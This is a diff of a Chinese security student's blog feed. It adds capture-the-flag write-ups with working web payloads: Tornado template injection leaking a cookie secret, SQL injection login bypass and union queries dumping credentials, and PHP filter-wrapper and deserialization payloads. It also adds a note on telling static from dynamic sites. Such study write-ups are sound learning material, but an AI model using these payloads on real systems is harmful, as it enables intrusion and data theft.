@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://Ro1ing.github.io</id>
     <title>Ro1ing</title>
-    <updated>2021-01-30T05:55:43.581Z</updated>
+    <updated>2021-01-30T06:22:29.020Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://Ro1ing.github.io"/>
     <link rel="self" href="https://Ro1ing.github.io/atom.xml"/>
@@ -10,6 +10,273 @@
     <logo>https://Ro1ing.github.io/images/avatar.png</logo>
     <icon>https://Ro1ing.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, Ro1ing</rights>
+    <entry>
+        <title type="html"><![CDATA[[护网杯2018]easy_tornado]]></title>
+        <id>https://Ro1ing.github.io/post/hu-wang-bei-2018easy_tornado/</id>
+        <link href="https://Ro1ing.github.io/post/hu-wang-bei-2018easy_tornado/">
+        </link>
+        <updated>2021-01-30T06:21:08.000Z</updated>
+        <content type="html"><![CDATA[<p>都打开看看</p>
+<blockquote>
+<p>/flag. txt<br>
+flag in/flllllllag</p>
+</blockquote>
+<blockquote>
+<p>/welcome. txt<br>
+render</p>
+</blockquote>
+<blockquote>
+<p>/hints. txt<br>
+md5(cookie_secret+md5(filename) )</p>
+</blockquote>
+<p><strong>render()函数详解</strong></p>
+<blockquote>
+<p>1.<strong>render方法的实质就是生成 itemplate模板</strong><br>
+2.通过调用一个方法来生成，而这个方法是通过 render方法的参数传递给它的<br>
+3.这个方法有三个参数，分别提供标签名，标签相关属性，标签内部的htm内容<br>
+4.通过这三个参数，可以生成一个完整的木模板</p>
+<p>tips：</p>
+<blockquote>
+<p>1、render方法可以使用SX语法，但需要 Babel plugin插件<br>
+2、 render方法里的第三个参数可以使用函数来生成多个组件（特别是如果他们相同的话），只要生成结果是一个数组，且数组元素都是vNode即可</p>
+</blockquote>
+</blockquote>
+<p>通过这种方式在网页上显示</p>
+<p><strong>render 标志着模板注入</strong></p>
+<blockquote>
+<p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用</p>
+</blockquote>
+<p>测试一下</p>
+<blockquote>
+<p>/error?msg={ {1*2} }</p>
+</blockquote>
+<p>经过测试发现过滤</p>
+<p>payload:</p>
+<blockquote>
+<p>/error?msg={ {handler.settings} }</p>
+</blockquote>
+<p>cookie_secret 是handler.application.settings 的 <a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/">键值</a><br>
+拿到 cookie_secret 解密</p>
+<pre><code class="language-python">import hashlib
+hash = hashlib.md5()
+
+filename='/fllllllllllllag'
+cookie_secret=&quot;8b1de274-3078-4412-a8c4-a6835eeda4a1&quot;
+hash.update(filename.encode('utf-8'))
+s1=hash.hexdigest()
+hash = hashlib.md5()
+hash.update((cookie_secret+s1).encode('utf-8'))
+print(hash.hexdigest())
+</code></pre>
+<p>得到flag</p>
+<p><strong>拓展</strong>:</p>
+<pre><code class="language-python">#生成 Tornado 所需的 cookie_secret 的办法
+import base64
+import uuid
+base64.b64encode(uuid.uuid4().bytes + uuid.uuid4().bytes)
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[极客大挑战 2019]LoveSQL]]></title>
+        <id>https://Ro1ing.github.io/post/ji-ke-da-tiao-zhan-2019lovesql/</id>
+        <link href="https://Ro1ing.github.io/post/ji-ke-da-tiao-zhan-2019lovesql/">
+        </link>
+        <updated>2021-01-30T06:20:14.000Z</updated>
+        <content type="html"><![CDATA[<p>用户登录界面</p>
+<blockquote>
+<p>尝试使用万能密码</p>
+<pre><code>admin/1'or'1'='1
+</code></pre>
+</blockquote>
+<p>测试单引号' 观察是否有报错信息<br>
+这里我就可以知道为 <strong>字符型注入</strong><br>
+如果是<strong>整形</strong> 报错信息为“12’”<br>
+所以我们要使用到闭合语句来完成</p>
+<p>字符型和数字型最大的一个区别在于，数字型<u>不需要单引号来闭合</u>，而字符串<u>一般需要通过单引号来闭合的</u>。</p>
+<p>这里使用 <strong>%23</strong> 来闭合</p>
+<blockquote>
+<p>不知道这里为什么 <u>#</u>  <em>--+</em> 不行</p>
+</blockquote>
+<p>payload：</p>
+<blockquote>
+<p>?username=1&amp;password=12' %23<br>
+没有报错有回显 NO</p>
+</blockquote>
+<p>尝试联合注入</p>
+<blockquote>
+<p>?username=1&amp;password=12' union select 1%23<br>
+回显<br>
+The used sELECT statements have a different number of columns<br>
+提示了我们后面有更多的列数</p>
+</blockquote>
+<p>添加更多的列</p>
+<blockquote>
+<p>?username=1&amp;password=12' union select 1,2,3%23</p>
+</blockquote>
+<p>查询当前数据库名字</p>
+<blockquote>
+<p>?username=1&amp;password=12' union select 1,database(),3%23</p>
+</blockquote>
+<p>发现库名geek<br>
+在2字段使用group_concat()无效<br>
+查询一下3字段</p>
+<blockquote>
+<p>?username=1&amp;password=12' union select 1, 2, group_concat(table_name)from information_schema.tables where table_schema='geek' %23</p>
+</blockquote>
+<p>看到<u>geek</u>里面有两个表 再查列</p>
+<blockquote>
+<p>?username=1&amp;password=12' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='geek' %23<br>
+?username=1&amp;password=12' union select 1, 2,<br>
+group_concat(password) from lovelysq1 %23</p>
+</blockquote>
+<p>得到flag<br>
+知识点:<br>
+<strong>字符型注入</strong><br>
+字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ [ZJCTF 2019]NiZhuanSiWei]]></title>
+        <id>https://Ro1ing.github.io/post/buuctf-web/</id>
+        <link href="https://Ro1ing.github.io/post/buuctf-web/">
+        </link>
+        <updated>2021-01-30T06:10:35.000Z</updated>
+        <content type="html"><![CDATA[<p>代码审计<br>
+查看一下useless.php --只有注释信息 没有用<br>
+利用data协议绕过<br>
+将welcome to the zjctf写入<br>
+而data://协议允许读入<br>
+payload：</p>
+<blockquote>
+<p>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</p>
+</blockquote>
+<p>到这里就不会了 只有看下wp了</p>
+<p>正则判断里面是否有flag字符，如果没有的话，并运行指定文件。</p>
+<p>利用filter来进行读取指定文件</p>
+<p>payload：</p>
+<blockquote>
+<p>file=php://filter/read=convert.base64-encode/resource=useless.php</p>
+</blockquote>
+<p>得到 base64解码</p>
+<pre><code class="language-php">&lt;?php  
+
+class Flag{  //flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this-&gt;file)){  
+            echo file_get_contents($this-&gt;file); 
+            echo &quot;&lt;br&gt;&quot;;
+        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
+        }  
+    }  
+}  
+?&gt;  
+</code></pre>
+<p>将flag调用，然后给里面file值赋值为flag.php。<br>
+序列化后传入password，应该就会出flag。</p>
+<blockquote>
+<p>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p>
+</blockquote>
+<p>三者结合</p>
+<p>payload：</p>
+<blockquote>
+<p>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p>
+</blockquote>
+<p>得到flag</p>
+<p>知识点：</p>
+<p><strong>序列号与反序列化</strong>知识：</p>
+<p>https://www.jianshu.com/p/631606cc5b76</p>
+<p>https://www.cnblogs.com/20175211lyz/p/11403397.html</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">类型</th>
+<th style="text-align:center">结构结构</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">String(字符串)</td>
+<td style="text-align:center">s:size:value;</td>
+</tr>
+<tr>
+<td style="text-align:center">Integer(整型)</td>
+<td style="text-align:center">i:value;</td>
+</tr>
+<tr>
+<td style="text-align:center">Boolean(布尔型)</td>
+<td style="text-align:center">b:value;(保存1或0)</td>
+</tr>
+<tr>
+<td style="text-align:center">Null</td>
+<td style="text-align:center">N;</td>
+</tr>
+<tr>
+<td style="text-align:center">Array(列)</td>
+<td style="text-align:center">a:size:{key definition;value definition;(repeated per element)}</td>
+</tr>
+<tr>
+<td style="text-align:center">Object</td>
+<td style="text-align:center">O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</td>
+</tr>
+</tbody>
+</table>
+<p>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p>
+<p>例如这里，O代表对象，4为对象长度，1代表有一个成员变量。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[静态网站和动态网站的区别]]></title>
+        <id>https://Ro1ing.github.io/post/jing-tai-wang-zhan-he-dong-tai-wang-zhan-de-qu-bie/</id>
+        <link href="https://Ro1ing.github.io/post/jing-tai-wang-zhan-he-dong-tai-wang-zhan-de-qu-bie/">
+        </link>
+        <updated>2021-01-30T06:06:27.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>静态网站</strong>：没有进行数据交互的网页，不支持数据传输，页面后缀一般是“.html”。</p>
+<blockquote>
+<p>静态网站是最初的建站方式，浏览者所看到的每个页面是建站者上传到服务器上的一个 html （ htm ）文件，这种网站每增加、删除、修改一个页面，都必须重新对服务器的文件进行一次下载上传。网页内容一经发布到网站服务器上，无论是否有用户访问，每个静态网页的内容都是保存在网站服务器上的，也就是说，静态网页是实实在在保存在服务器上的文件，每个网页都是一个独立的文件；<br>
+静态网页的内容相对稳定，因此容易被搜索引擎检索；<br>
+静态网页没有数据库的支持，在网站制作和维护方面工作量较大，因此当网站信息量很大时完全依靠静态网页制作方式比较困难；静态网页的交互性较差，在功能方面有较大的限制。</p>
+</blockquote>
+<p><strong>动态网站</strong>：支持数据交互的网站</p>
+<ol>
+<li>交互性：网页会根据用户的要求和选择而动态地改变和响应，浏览器作为客户端，成为一个动态交流的桥梁，动态网页的交互性也是今后 Web 发展的潮流。</li>
+<li>自动更新：即无须手动更新 HTML 文档，便会自动生成新页面，可以大大节省工作量。</li>
+<li>因时因人而变：即当不同时间、不同用户访问同一网址时会出现不同页面。</li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://Ro1ing.github.io/post-images/1611986854582.png" alt="" loading="lazy"></figure>
+<p>最常见的网站是PHP和Java语言做的网站了，PHP开发速度快于Java，PHP能够快速的搭建环境，以及编辑一个页面。</p>
+<p>静态网站是指全部由HTML（标准通用标记语言的子集）代码格式页面组成的网站，所有的内容包含在网页文件中。网页上也可以出现各种视觉动态效果，如GIF动画，FLASH动画，滚动字幕等，而网站主要是静态化的页面和代码组成，一般文件名均以htm，html，shtml等为后缀。</p>
+<p><em>注意HTML是标记语言而非编程语言</em></p>
+<ul>
+<li><strong>关于标记语言与编程语言</strong></li>
+</ul>
+<blockquote>
+<p>标记语言，是一种将文本（Text）以及文本相关的其他信息结合起来，展现出关于文档结构和数据处理细节的电脑文字编码。与文本相关的其他信息（包括例如文本的结构和表示信息等）与原来的文本结合在一起，但是使用标记（markup）进行标识。<br>
+编译型语言：程序在执行之前需要一个专门的编译过程，把程序编译成 为机器语言的文件，运行时不需要重新翻译，直接使用编译的结果就行了。程序执行效率高，依赖编译器，跨平台性差些，标记语言不用于向计算机发出指令，常用于格式化和链接。<br>
+编译型语言写的程序执行之前，需要一个专门的编译过程，把程序编译成为机器语言的文件，比如exe文件，以后要运行的话就不用重新翻译了，直接使用编译的结果就行了（exe文件），因为翻译只做了一次，运行时不需要翻译，所以编译型语言的程序执行效率高。<br>
+两者最简单的区别在于，编程语言有逻辑和行为能力，而标记语言没有。<br>
+静态网站的安全性是要比动态网站更高的，因为静态网站本身没有与服务器的数据交互。</p>
+</blockquote>
+<p>动态网站并不是指具有动画功能的网站，而是指网站内容可根据不用情况动态变更的网站，一般情况下动态网站通过数据库进行架构，动态网站除了要设计网页外，还要童工数据库和编程序来使网站具有更多自动的和高级的功能。动态网站体现在网页一般是以asp，jsp，php，aspx等结束，而静态网页一般是以HTML（标准通用标记语言的子集）结尾，动态网站服务器空间配置要比静态的网页要求高，费用也相应的高，不过动态网页利于网站内容的更新，适合企业建站，动态是相对于静态而言。由动态的脚本编写，需要后台数据库支持。</p>
+<ul>
+<li><strong>静态与动态的区别</strong></li>
+</ul>
+<blockquote>
+<p>静态网站用于发布，比如发布一些文章，他不需要用户进行注册；动态则像是论坛，或者淘宝之类，有着大量数据流通的网站，我们判断一个网站属于静态还是动态，就直接在网站后面看他是什么结尾的就好了</p>
+<p>那么结尾没有显示脚本语言子集怎么办呢</p>
+<p>我们可以在网址后面，加上一个指令：index<express></p>
+<p>比如index.html，如果没有报错，那么我们就可以证明这就是一个html网站</p>
+<p>基于这个方法我们甚至可以判断这个网站是windows系统还是linux系统，这里使用的是linux系统对大小写敏感的问题</p>
+<p>比如你对一个html网站跟上index.Html，这个时候如果没报错，就是windows系统，如果报错，就是linux系统，因为Html这个写法linux无法识别</p>
+</blockquote>
+<blockquote>
+<p>那么还有一种情况，伪静态<br>
+对于有些网站，你删除网址最后的html，或者改成php，或者一些其他的“在网址上让其不从属于静态网站”的操作时，他不会报错，依然可以正常显示网页内容，这样的网站就是伪静态网站。<br>
+伪静态是相对真实静态来讲的，通常我们为了增强<a href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/104812">搜索引擎</a>的友好面，都将文章内容生成静态页面，但是有的朋友为了实时的显示一些信息。或者还想运用动态脚本解决一些问题。不能用静态的方式来展示网站内容。但是这就损失了对搜索引擎的友好面。怎么样在两者之间找个中间方法呢，这就产生了伪静态技术。就是展示出来的是以html一类的静态页面形式，但其实是用ASP一类的动态脚本来处理的</p>
+</blockquote>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[渗透基础学习笔记]]></title>
         <id>https://Ro1ing.github.io/post/shen-tou-ji-chu-xue-xi-bi-ji/</id>
@@ -393,38 +660,6 @@ DFX：DFX是一种高效的XML索引方法，此文件夹与数据索引有关�
 <p><a href="https://baike.baidu.com/item/TCP%2FIP%E5%8D%8F%E8%AE%AE">TCP/IP协议</a>中，FTP标准命令TCP<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3">端口</a>号为21，Port方式数据端口为20。FTP的任务是从一台计算机将文件传送到另一台计算机，不受<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a>的限制。</p>
 <p>需要进行远程文件传输的计算机必须安装和运行ftp客户程序。在windows操作系统的安装过程中，通常都安装了tcp/ip协议软件，其中就包含了ftp客户程序。但是该程序是字符界面而不是图形界面，这就必须以<a href="https://baike.baidu.com/item/%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6">命令提示符</a>的方式进行操作，很不方便。</p>
 </blockquote>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Hello Gridea]]></title>
-        <id>https://Ro1ing.github.io/post/hello-gridea/</id>
-        <link href="https://Ro1ing.github.io/post/hello-gridea/">
-        </link>
-        <updated>2018-12-11T16:00:00.000Z</updated>
-        <summary type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
-✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
-]]></summary>
-        <content type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
-✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
-<!-- more -->
-<p><a href="https://github.com/getgridea/gridea">Github</a><br>
-<a href="https://gridea.dev/">Gridea 主页</a><br>
-<a href="http://fehey.com/">示例网站</a></p>
-<h2 id="特性">特性👇</h2>
-<p>📝  你可以使用最酷的 <strong>Markdown</strong> 语法，进行快速创作</p>
-<p>🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片</p>
-<p>🏷️  你可以对文章进行标签分组</p>
-<p>📋  你可以自定义菜单，甚至可以创建外部链接菜单</p>
-<p>💻  你可以在 <strong>Windows</strong>，<strong>MacOS</strong> 或 <strong>Linux</strong> 设备上使用此客户端</p>
-<p>🌎  你可以使用 <strong>𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌</strong> 或 <strong>Coding Pages</strong> 向世界展示，未来将支持更多平台</p>
-<p>💬  你可以进行简单的配置，接入 <a href="https://github.com/gitalk/gitalk">Gitalk</a> 或 <a href="https://github.com/SukkaW/DisqusJS">DisqusJS</a> 评论系统</p>
-<p>🇬🇧  你可以使用<strong>中文简体</strong>或<strong>英语</strong></p>
-<p>🌁  你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力</p>
-<p>🖥  你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步</p>
-<p>🌱 当然 <strong>Gridea</strong> 还很年轻，有很多不足，但请相信，它会不停向前 🏃</p>
-<p>未来，它一定会成为你离不开的伙伴</p>
-<p>尽情发挥你的才华吧！</p>
-<p>😘 Enjoy~</p>
 ]]></content>
     </entry>
 </feed>
